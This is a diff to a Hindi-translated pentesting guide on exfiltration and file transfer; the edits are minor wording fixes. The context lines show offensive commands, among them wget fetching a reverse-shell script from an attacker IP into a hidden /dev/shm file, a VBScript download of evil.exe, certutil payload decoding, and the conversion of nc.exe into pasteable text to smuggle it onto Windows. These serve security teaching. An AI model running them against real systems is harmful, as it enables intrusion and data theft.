@@ -4,7 +4,7 @@
 
 ## जानकारी निकालने के लिए सामान्य रूप से व्हाइटलिस्टेड डोमेन
 
-जानकारी निकालने के लिए सामान्य रूप से व्हाइटलिस्टेड डोमेन खोजने के लिए [https://lots-project.com/](https://lots-project.com/) पर जांचें
+जानकारी निकालने के लिए सामान्य रूप से व्हाइटलिस्टेड डोमेन खोजने के लिए [https://lots-project.com/](https://lots-project.com/) पर जाएं
 
 ## Copy\&Paste Base64
 
@@ -20,7 +20,7 @@ certutil -decode payload.b64 payload.dll
 ```
 ## HTTP
 
-**लिनक्स**
+**Linux**
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
@@ -150,7 +150,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-या smb शेयर **samba का उपयोग करके** बनाएं:
+या smb शेयर **samba** का उपयोग करके बनाएं:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -296,13 +296,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` प्रोग्राम न केवल बाइनरी की जांच करने की अनुमति देता है बल्कि इसमें **हैक्स से उन्हें फिर से बनाने की क्षमता** भी है। इसका मतलब है कि एक बाइनरी का हैक्स प्रदान करके, `debug.exe` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालाँकि, यह ध्यान रखना महत्वपूर्ण है कि debug.exe में **64 kb आकार तक फ़ाइलों को असेंबल करने की सीमा** है।
+The `debug.exe` प्रोग्राम न केवल बाइनरी की जांच करने की अनुमति देता है बल्कि इसमें **हैक्स से उन्हें फिर से बनाने की क्षमता भी है**। इसका मतलब है कि एक बाइनरी का हैक्स प्रदान करके, `debug.exe` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालाँकि, यह ध्यान रखना महत्वपूर्ण है कि debug.exe में **64 kb आकार तक की फ़ाइलों को असेंबल करने की सीमा है**।
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-फिर टेक्स्ट को विंडोज-शेल में कॉपी-पेस्ट करें और एक फ़ाइल nc.exe बनाई जाएगी।
+फिर टेक्स्ट को विंडोज-शेल में कॉपी-पेस्ट करें और एक फ़ाइल बनाई जाएगी जिसका नाम nc.exe होगा।
 
 ## DNS
 
